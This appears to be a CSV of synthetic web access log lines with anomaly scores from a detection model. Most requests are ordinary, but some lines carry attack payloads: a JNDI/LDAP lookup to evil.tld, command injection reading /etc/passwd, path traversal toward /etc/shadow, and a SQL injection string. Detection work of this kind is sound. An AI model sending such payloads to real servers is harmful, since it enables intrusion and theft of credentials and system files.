score_content,score_session,score_fused,score_fused_norm,line
35.76856231689453,,35.76856231689453,35.76856231689453,219.245.104.137 - - [10/Jan/2025:12:24:43 +0000] "PUT /search?q=monitor HTTP/1.1" 201 572 "-" "nikto/2.5.0"
127.18392944335938,,127.18392944335938,127.18392944335938,30.138.150.200 - - [10/Jan/2025:12:24:44 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 15509 "https://example.com/" "sqlmap/1.7.2#stable"
104.8086166381836,,104.8086166381836,104.8086166381836,224.132.222.130 - - [10/Jan/2025:12:24:44 +0000] "TRACE /logout HTTP/1.1" 200 15451 "-" "nikto/2.5.0"
35.85729217529297,,35.85729217529297,35.85729217529297,25.194.2.117 - - [10/Jan/2025:12:24:46 +0000] "PUT /search?q=ssd HTTP/1.1" 200 2511 "https://twitter.com/" "nikto/2.5.0"
30129.587890625,,30129.587890625,30129.587890625,229.206.14.229 - - [10/Jan/2025:12:24:46 +0000] "POST /login HTTP/1.1" 404 128 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.19828130304813385,,0.19828130304813385,0.19828130304813385,134.125.171.7 - - [10/Jan/2025:12:24:48 +0000] "GET /assets/app.css HTTP/1.1" 201 1619 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2032095044851303,,0.2032095044851303,0.2032095044851303,25.45.175.84 - - [10/Jan/2025:12:24:50 +0000] "GET /assets/app.css HTTP/1.1" 200 2639 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.70206069946289,,47.70206069946289,47.70206069946289,141.68.49.184 - - [10/Jan/2025:12:24:51 +0000] "HEAD /about HTTP/1.1" 201 3341 "-" "python-requests/2.31.0"
0.2813035249710083,,0.2813035249710083,0.2813035249710083,228.170.109.75 - - [10/Jan/2025:12:24:54 +0000] "GET /assets/app.js HTTP/1.1" 200 14425 "https://news.ycombinator.com/" "curl/7.85.0"
70.07847595214844,,70.07847595214844,70.07847595214844,218.237.205.225 - - [10/Jan/2025:12:24:57 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 11229 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1620705127716064,,3.1620705127716064,3.1620705127716064,190.168.60.60 - - [10/Jan/2025:12:24:59 +0000] "GET /assets/app.js HTTP/1.1" 302 15087 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
95.75422668457031,,95.75422668457031,95.75422668457031,199.163.213.51 - - [10/Jan/2025:12:25:01 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 7873 "https://twitter.com/" "dirb/2.22"
13.345013618469238,,13.345013618469238,13.345013618469238,186.91.80.78 - - [10/Jan/2025:12:25:02 +0000] "PUT /api/products HTTP/1.1" 200 10782 "-" "python-requests/2.31.0"
27.228349685668945,,27.228349685668945,27.228349685668945,122.117.176.243 - - [10/Jan/2025:12:25:04 +0000] "POST /search?q=router HTTP/1.1" 200 4029 "https://example.com/" "dirb/2.22"
69.97776794433594,,69.97776794433594,69.97776794433594,139.151.89.112 - - [10/Jan/2025:12:25:04 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 5899 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.66156005859375,,47.66156005859375,47.66156005859375,70.134.110.188 - - [10/Jan/2025:12:25:07 +0000] "HEAD /logout HTTP/1.1" 200 2474 "https://example.com/" "python-requests/2.31.0"
35.73486328125,,35.73486328125,35.73486328125,34.97.15.219 - - [10/Jan/2025:12:25:09 +0000] "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 789 "https://twitter.com/" "dirb/2.22"
27.261402130126953,,27.261402130126953,27.261402130126953,121.238.116.195 - - [10/Jan/2025:12:25:11 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 6073 "https://www.google.com/" "curl/7.85.0"
27.256977081298828,,27.256977081298828,27.256977081298828,149.212.222.225 - - [10/Jan/2025:12:25:14 +0000] "POST /search?q=router HTTP/1.1" 200 9867 "https://news.ycombinator.com/" "dirb/2.22"
30138.005859375,,30138.005859375,30138.005859375,33.212.168.82 - - [10/Jan/2025:12:25:17 +0000] "PUT /contact HTTP/1.1" 404 1238 "https://example.com/" "sqlmap/1.7.2#stable"
0.24218934774398804,,0.24218934774398804,0.24218934774398804,34.124.43.129 - - [10/Jan/2025:12:25:18 +0000] "GET /assets/app.css HTTP/1.1" 200 10689 "https://twitter.com/" "nikto/2.5.0"
27.782270431518555,,27.782270431518555,27.782270431518555,164.50.136.200 - - [10/Jan/2025:12:25:19 +0000] "DELETE /about HTTP/1.1" 200 17221 "https://twitter.com/" "nikto/2.5.0"
2.284590721130371,,2.284590721130371,2.284590721130371,102.124.194.122 - - [10/Jan/2025:12:25:21 +0000] "GET / HTTP/1.1" 200 9117 "https://news.ycombinator.com/" "nikto/2.5.0"
35.7155647277832,,35.7155647277832,35.7155647277832,83.130.144.92 - - [10/Jan/2025:12:25:23 +0000] "PUT /search?q=headphones HTTP/1.1" 200 4252 "https://www.google.com/" "sqlmap/1.7.2#stable"
27.633039474487305,,27.633039474487305,27.633039474487305,14.40.51.164 - - [10/Jan/2025:12:25:26 +0000] "DELETE /api/products HTTP/1.1" 200 15068 "https://www.google.com/" "curl/7.85.0"
73.35275268554688,,73.35275268554688,73.35275268554688,98.141.161.38 - - [10/Jan/2025:12:25:28 +0000] "OPTIONS /logout HTTP/1.1" 200 2783 "https://example.com/" "dirb/2.22"
0.2010180503129959,,0.2010180503129959,0.2010180503129959,199.194.109.209 - - [10/Jan/2025:12:25:31 +0000] "GET /assets/app.css HTTP/1.1" 200 1238 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
107.5578842163086,,107.5578842163086,107.5578842163086,2.186.95.80 - - [10/Jan/2025:12:25:34 +0000] "TRACE /api/products HTTP/1.1" 304 924 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.26020869612693787,,0.26020869612693787,0.26020869612693787,108.15.224.21 - - [10/Jan/2025:12:25:34 +0000] "GET /assets/app.css HTTP/1.1" 200 15511 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.830324172973633,,7.830324172973633,7.830324172973633,204.81.104.183 - - [10/Jan/2025:12:25:37 +0000] "POST /login HTTP/1.1" 302 18059 "https://www.google.com/" "python-requests/2.31.0"
30229.3359375,,30229.3359375,30229.3359375,191.135.175.57 - - [10/Jan/2025:12:25:38 +0000] "TRACE /about HTTP/1.1" 401 1385 "https://news.ycombinator.com/" "curl/7.85.0"
0.2075340747833252,,0.2075340747833252,0.2075340747833252,195.189.81.33 - - [10/Jan/2025:12:25:40 +0000] "GET /assets/app.css HTTP/1.1" 200 3521 "https://news.ycombinator.com/" "python-requests/2.31.0"
95.76721954345703,,95.76721954345703,95.76721954345703,101.166.118.11 - - [10/Jan/2025:12:25:42 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 10792 "https://example.com/" "sqlmap/1.7.2#stable"
2.3075928688049316,,2.3075928688049316,2.3075928688049316,65.28.24.247 - - [10/Jan/2025:12:25:45 +0000] "GET / HTTP/1.1" 200 14996 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
50.20246887207031,,50.20246887207031,50.20246887207031,100.143.248.198 - - [10/Jan/2025:12:25:48 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16422 "-" "python-requests/2.31.0"
50.12164306640625,,50.12164306640625,50.12164306640625,212.61.43.98 - - [10/Jan/2025:12:25:48 +0000] "DELETE /search?q=camera HTTP/1.1" 200 18193 "https://twitter.com/" "dirb/2.22"
2.280484437942505,,2.280484437942505,2.280484437942505,164.200.93.251 - - [10/Jan/2025:12:25:49 +0000] "GET / HTTP/1.1" 200 8211 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30148.716796875,,30148.716796875,30148.716796875,238.92.241.32 - - [10/Jan/2025:12:25:49 +0000] "GET /search?q=headphones HTTP/1.1" 401 24 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30124.849609375,,30124.849609375,30124.849609375,82.162.90.239 - - [10/Jan/2025:12:25:49 +0000] "GET /assets/app.css HTTP/1.1" 404 1353 "https://twitter.com/" "curl/7.85.0"
35.88934326171875,,35.88934326171875,35.88934326171875,193.150.205.173 - - [10/Jan/2025:12:25:50 +0000] "PUT /search?q=ssd HTTP/1.1" 204 10406 "https://www.google.com/" "nikto/2.5.0"
4.936270236968994,,4.936270236968994,4.936270236968994,43.17.91.203 - - [10/Jan/2025:12:25:50 +0000] "POST /about HTTP/1.1" 204 165 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
47.55978012084961,,47.55978012084961,47.55978012084961,58.27.22.189 - - [10/Jan/2025:12:25:51 +0000] "HEAD /api/products HTTP/1.1" 200 2877 "-" "dirb/2.22"
95.84552764892578,,95.84552764892578,95.84552764892578,17.81.232.35 - - [10/Jan/2025:12:25:53 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 11687 "https://news.ycombinator.com/" "python-requests/2.31.0"
70.12035369873047,,70.12035369873047,70.12035369873047,110.144.243.18 - - [10/Jan/2025:12:25:56 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 1190 "https://twitter.com/" "curl/7.85.0"
35.92482376098633,,35.92482376098633,35.92482376098633,109.77.224.93 - - [10/Jan/2025:12:25:58 +0000] "PUT /search?q=ssd HTTP/1.1" 200 18393 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
2.0208816528320312,,2.0208816528320312,2.0208816528320312,203.234.198.117 - - [10/Jan/2025:12:26:01 +0000] "GET /logout HTTP/1.1" 200 7277 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.7802727222442627,,1.7802727222442627,1.7802727222442627,33.190.126.246 - - [10/Jan/2025:12:26:01 +0000] "GET /server-status HTTP/1.1" 201 3895 "https://news.ycombinator.com/" "curl/7.85.0"
2.2629387378692627,,2.2629387378692627,2.2629387378692627,119.1.141.154 - - [10/Jan/2025:12:26:04 +0000] "GET / HTTP/1.1" 204 5986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.40084838867188,,73.40084838867188,73.40084838867188,121.188.195.208 - - [10/Jan/2025:12:26:04 +0000] "OPTIONS /login HTTP/1.1" 200 4634 "https://example.com/" "sqlmap/1.7.2#stable"
27.285032272338867,,27.285032272338867,27.285032272338867,35.141.215.84 - - [10/Jan/2025:12:26:06 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 11260 "https://news.ycombinator.com/" "dirb/2.22"
0.22308579087257385,,0.22308579087257385,0.22308579087257385,41.185.78.57 - - [10/Jan/2025:12:26:08 +0000] "GET /assets/app.css HTTP/1.1" 200 6491 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.321760654449463,,2.321760654449463,2.321760654449463,104.129.201.250 - - [10/Jan/2025:12:26:11 +0000] "GET / HTTP/1.1" 200 19403 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
47.71780776977539,,47.71780776977539,47.71780776977539,145.169.188.3 - - [10/Jan/2025:12:26:14 +0000] "HEAD /logout HTTP/1.1" 200 14961 "-" "curl/7.85.0"
13.355966567993164,,13.355966567993164,13.355966567993164,104.51.124.162 - - [10/Jan/2025:12:26:16 +0000] "PUT /dashboard HTTP/1.1" 204 15883 "-" "Wget/1.21.2 (linux-gnu)"
30137.89453125,,30137.89453125,30137.89453125,223.213.190.205 - - [10/Jan/2025:12:26:17 +0000] "PUT /api/products HTTP/1.1" 403 1348 "https://www.google.com/" "dirb/2.22"
0.35242679715156555,,0.35242679715156555,0.35242679715156555,66.80.113.113 - - [10/Jan/2025:12:26:19 +0000] "GET /.git/config HTTP/1.1" 200 19473 "https://example.com/" "python-requests/2.31.0"
126.98967742919922,,126.98967742919922,126.98967742919922,74.214.178.24 - - [10/Jan/2025:12:26:20 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 1625 "https://example.com/" "python-requests/2.31.0"
1.9827693700790405,,1.9827693700790405,1.9827693700790405,167.94.244.7 - - [10/Jan/2025:12:26:23 +0000] "GET /contact HTTP/1.1" 200 6975 "https://news.ycombinator.com/" "python-requests/2.31.0"
127.22317504882812,,127.22317504882812,127.22317504882812,195.41.7.215 - - [10/Jan/2025:12:26:24 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 17677 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8339285850524902,,1.8339285850524902,1.8339285850524902,16.173.105.246 - - [10/Jan/2025:12:26:27 +0000] "GET /server-status HTTP/1.1" 200 15780 "https://news.ycombinator.com/" "python-requests/2.31.0"
38.636722564697266,,38.636722564697266,38.636722564697266,187.188.198.82 - - [10/Jan/2025:12:26:28 +0000] "PUT /search?q=monitor HTTP/1.1" 301 6472 "https://news.ycombinator.com/" "python-requests/2.31.0"
70.060546875,,70.060546875,70.060546875,219.56.160.183 - - [10/Jan/2025:12:26:28 +0000] "HEAD /search?q=phone HTTP/1.1" 200 2853 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.881432056427002,,4.881432056427002,4.881432056427002,227.85.119.90 - - [10/Jan/2025:12:26:31 +0000] "POST /profile HTTP/1.1" 200 19641 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.67671203613281,,95.67671203613281,95.67671203613281,68.67.48.199 - - [10/Jan/2025:12:26:32 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 7553 "-" "sqlmap/1.7.2#stable"
69.99075317382812,,69.99075317382812,69.99075317382812,22.218.58.134 - - [10/Jan/2025:12:26:33 +0000] "HEAD /search?q=headphones HTTP/1.1" 200 8527 "https://example.com/" "curl/7.85.0"
30.120832443237305,,30.120832443237305,30.120832443237305,116.105.182.224 - - [10/Jan/2025:12:26:34 +0000] "POST /search?q=phone HTTP/1.1" 302 3149 "https://twitter.com/" "sqlmap/1.7.2#stable"
70.08953094482422,,70.08953094482422,70.08953094482422,205.248.111.120 - - [10/Jan/2025:12:26:34 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 14099 "-" "sqlmap/1.7.2#stable"
35.89393997192383,,35.89393997192383,35.89393997192383,33.170.142.92 - - [10/Jan/2025:12:26:35 +0000] "PUT /search?q=ssd HTTP/1.1" 200 9900 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
30172.205078125,,30172.205078125,30172.205078125,176.60.43.181 - - [10/Jan/2025:12:26:35 +0000] "HEAD /contact HTTP/1.1" 401 187 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.76465606689453,,95.76465606689453,95.76465606689453,179.180.116.67 - - [10/Jan/2025:12:26:35 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 10183 "-" "curl/7.85.0"
35.7307014465332,,35.7307014465332,35.7307014465332,66.113.8.75 - - [10/Jan/2025:12:26:36 +0000] "PUT /search?q=headphones HTTP/1.1" 200 7158 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
4.898468494415283,,4.898468494415283,4.898468494415283,24.139.140.86 - - [10/Jan/2025:12:26:39 +0000] "POST /logout HTTP/1.1" 200 13660 "-" "sqlmap/1.7.2#stable"
35.793006896972656,,35.793006896972656,35.793006896972656,252.235.137.102 - - [10/Jan/2025:12:26:42 +0000] "PUT /search?q=monitor HTTP/1.1" 200 8822 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
5.97962760925293,,5.97962760925293,5.97962760925293,177.134.219.162 - - [10/Jan/2025:12:26:44 +0000] "POST /../../etc/passwd HTTP/1.1" 304 13975 "https://twitter.com/" "nikto/2.5.0"
30220.001953125,,30220.001953125,30220.001953125,176.24.164.184 - - [10/Jan/2025:12:26:45 +0000] "OPTIONS /search?q=router HTTP/1.1" 401 777 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
104.6460189819336,,104.6460189819336,104.6460189819336,201.252.53.188 - - [10/Jan/2025:12:26:48 +0000] "TRACE /api/products HTTP/1.1" 200 2265 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
107.59418487548828,,107.59418487548828,107.59418487548828,21.69.251.48 - - [10/Jan/2025:12:26:50 +0000] "TRACE /contact HTTP/1.1" 301 8422 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
73.31134033203125,,73.31134033203125,73.31134033203125,136.8.195.188 - - [10/Jan/2025:12:26:53 +0000] "OPTIONS /dashboard HTTP/1.1" 200 17575 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
127.10254669189453,,127.10254669189453,127.10254669189453,38.199.246.46 - - [10/Jan/2025:12:26:55 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7922 "https://twitter.com/" "curl/7.85.0"
3.0956532955169678,,3.0956532955169678,3.0956532955169678,32.60.20.22 - - [10/Jan/2025:12:26:55 +0000] "GET /assets/app.css HTTP/1.1" 302 5366 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
73.31547546386719,,73.31547546386719,73.31547546386719,64.67.111.100 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /contact HTTP/1.1" 200 2654 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.25733184814453,,73.25733184814453,73.25733184814453,38.152.19.14 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /dashboard HTTP/1.1" 200 4613 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.1857094764709473,,3.1857094764709473,3.1857094764709473,165.91.159.52 - - [10/Jan/2025:12:26:56 +0000] "POST /.git/config HTTP/1.1" 200 14213 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.25591132044792175,,0.25591132044792175,0.25591132044792175,235.23.44.111 - - [10/Jan/2025:12:26:58 +0000] "GET /wp-login.php HTTP/1.1" 200 2918 "https://www.google.com/" "sqlmap/1.7.2#stable"
73.45640563964844,,73.45640563964844,73.45640563964844,215.230.229.174 - - [10/Jan/2025:12:27:01 +0000] "OPTIONS /login HTTP/1.1" 200 18105 "https://news.ycombinator.com/" "curl/7.85.0"
70.0462646484375,,70.0462646484375,70.0462646484375,99.39.75.6 - - [10/Jan/2025:12:27:02 +0000] "HEAD /search?q=camera HTTP/1.1" 200 4516 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
45.8253288269043,,45.8253288269043,45.8253288269043,7.147.19.88 - - [10/Jan/2025:12:27:02 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 3847 "-" "nikto/2.5.0"
27.71605110168457,,27.71605110168457,27.71605110168457,146.173.34.73 - - [10/Jan/2025:12:27:05 +0000] "DELETE /logout HTTP/1.1" 200 257 "https://twitter.com/" "sqlmap/1.7.2#stable"
30129.392578125,,30129.392578125,30129.392578125,42.147.24.52 - - [10/Jan/2025:12:27:07 +0000] "POST /about HTTP/1.1" 401 1444 "-" "nikto/2.5.0"
73.40204620361328,,73.40204620361328,73.40204620361328,158.208.180.111 - - [10/Jan/2025:12:27:10 +0000] "OPTIONS /logout HTTP/1.1" 200 13396 "https://twitter.com/" "curl/7.85.0"
127.05253601074219,,127.05253601074219,127.05253601074219,32.176.72.212 - - [10/Jan/2025:12:27:11 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 3156 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30126.6171875,,30126.6171875,30126.6171875,170.113.217.94 - - [10/Jan/2025:12:27:14 +0000] "GET /login HTTP/1.1" 403 793 "https://www.google.com/" "curl/7.85.0"
2.2710413932800293,,2.2710413932800293,2.2710413932800293,197.44.5.3 - - [10/Jan/2025:12:27:17 +0000] "GET / HTTP/1.1" 200 406 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
24.468595504760742,,24.468595504760742,24.468595504760742,240.22.54.176 - - [10/Jan/2025:12:27:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 18886 "https://news.ycombinator.com/" "python-requests/2.31.0"
27.32469940185547,,27.32469940185547,27.32469940185547,140.207.88.61 - - [10/Jan/2025:12:27:20 +0000] "POST /api/product?id=123 HTTP/1.1" 200 19964 "https://example.com/" "dirb/2.22"
73.35060119628906,,73.35060119628906,73.35060119628906,177.114.243.58 - - [10/Jan/2025:12:27:20 +0000] "OPTIONS /profile HTTP/1.1" 200 9712 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30197.955078125,,30197.955078125,30197.955078125,19.132.170.88 - - [10/Jan/2025:12:27:22 +0000] "OPTIONS /profile HTTP/1.1" 403 395 "https://twitter.com/" "python-requests/2.31.0"
27.75879669189453,,27.75879669189453,27.75879669189453,18.93.62.212 - - [10/Jan/2025:12:27:22 +0000] "DELETE /about HTTP/1.1" 200 10762 "-" "Wget/1.21.2 (linux-gnu)"
52.960411071777344,,52.960411071777344,52.960411071777344,217.220.155.165 - - [10/Jan/2025:12:27:24 +0000] "DELETE /search?q=phone HTTP/1.1" 301 8018 "https://example.com/" "curl/7.85.0"
11061.462890625,,11061.462890625,11061.462890625,215.99.127.52 - - [10/Jan/2025:12:27:24 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 502 745 "-" "sqlmap/1.7.2#stable"
13.469488143920898,,13.469488143920898,13.469488143920898,94.115.134.171 - - [10/Jan/2025:12:27:27 +0000] "PUT /admin HTTP/1.1" 200 6896 "https://www.google.com/" "python-requests/2.31.0"
70.05821228027344,,70.05821228027344,70.05821228027344,89.237.48.16 - - [10/Jan/2025:12:27:27 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 945 "https://example.com/" "curl/7.85.0"
73.4510498046875,,73.4510498046875,73.4510498046875,149.160.32.178 - - [10/Jan/2025:12:27:28 +0000] "OPTIONS /admin HTTP/1.1" 200 16439 "https://www.google.com/" "curl/7.85.0"
95.70586395263672,,95.70586395263672,95.70586395263672,61.41.158.200 - - [10/Jan/2025:12:27:30 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 900 "https://twitter.com/" "sqlmap/1.7.2#stable"
50.4952392578125,,50.4952392578125,50.4952392578125,187.206.65.103 - - [10/Jan/2025:12:27:30 +0000] "HEAD /dashboard HTTP/1.1" 302 17780 "https://example.com/" "dirb/2.22"
27.311059951782227,,27.311059951782227,27.311059951782227,94.80.225.83 - - [10/Jan/2025:12:27:30 +0000] "POST /search?q=phone HTTP/1.1" 200 18387 "https://news.ycombinator.com/" "dirb/2.22"
50.09547424316406,,50.09547424316406,50.09547424316406,173.68.116.25 - - [10/Jan/2025:12:27:33 +0000] "DELETE /search?q=router HTTP/1.1" 200 10895 "-" "sqlmap/1.7.2#stable"
7.705798625946045,,7.705798625946045,7.705798625946045,93.81.57.174 - - [10/Jan/2025:12:27:33 +0000] "POST /profile HTTP/1.1" 301 9849 "https://www.google.com/" "dirb/2.22"
3.252211093902588,,3.252211093902588,3.252211093902588,192.99.67.3 - - [10/Jan/2025:12:27:34 +0000] "GET /index.html HTTP/1.1" 302 16722 "https://twitter.com/" "python-requests/2.31.0"
73.28208923339844,,73.28208923339844,73.28208923339844,61.179.47.135 - - [10/Jan/2025:12:27:36 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9669 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
127.1574935913086,,127.1574935913086,127.1574935913086,224.141.132.127 - - [10/Jan/2025:12:27:36 +0000] "TRACE /search?q=router HTTP/1.1" 200 8808 "https://news.ycombinator.com/" "nikto/2.5.0"
30197.9921875,,30197.9921875,30197.9921875,21.81.170.182 - - [10/Jan/2025:12:27:39 +0000] "OPTIONS /about HTTP/1.1" 401 135 "-" "python-requests/2.31.0"
30124.689453125,,30124.689453125,30124.689453125,196.168.139.230 - - [10/Jan/2025:12:27:41 +0000] "GET /assets/app.css HTTP/1.1" 400 750 "https://www.google.com/" "nikto/2.5.0"
11039.578125,,11039.578125,11039.578125,246.4.166.7 - - [10/Jan/2025:12:27:44 +0000] "GET / HTTP/1.1" 503 192 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
73.44794464111328,,73.44794464111328,73.44794464111328,43.12.32.25 - - [10/Jan/2025:12:27:45 +0000] "OPTIONS /login HTTP/1.1" 200 15512 "https://example.com/" "sqlmap/1.7.2#stable"
73.45708465576172,,73.45708465576172,73.45708465576172,140.181.141.211 - - [10/Jan/2025:12:27:46 +0000] "OPTIONS /about HTTP/1.1" 200 18323 "https://news.ycombinator.com/" "python-requests/2.31.0"
50.02350997924805,,50.02350997924805,50.02350997924805,35.21.207.14 - - [10/Jan/2025:12:27:49 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 11880 "https://example.com/" "curl/7.85.0"
35.903648376464844,,35.903648376464844,35.903648376464844,136.44.62.134 - - [10/Jan/2025:12:27:52 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 11033 "https://twitter.com/" "curl/7.85.0"
50.054195404052734,,50.054195404052734,50.054195404052734,254.248.136.205 - - [10/Jan/2025:12:27:53 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 988 "https://twitter.com/" "python-requests/2.31.0"
30194.513671875,,30194.513671875,30194.513671875,239.136.127.133 - - [10/Jan/2025:12:27:54 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 404 918 "https://example.com/" "python-requests/2.31.0"
35.856178283691406,,35.856178283691406,35.856178283691406,108.183.87.61 - - [10/Jan/2025:12:27:57 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 11062 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.849732875823975,,4.849732875823975,4.849732875823975,206.163.117.10 - - [10/Jan/2025:12:27:58 +0000] "GET /api/products HTTP/1.1" 304 240 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
70.15927124023438,,70.15927124023438,70.15927124023438,142.97.5.152 - - [10/Jan/2025:12:28:00 +0000] "HEAD /search?q=ssd HTTP/1.1" 204 14620 "https://news.ycombinator.com/" "nikto/2.5.0"
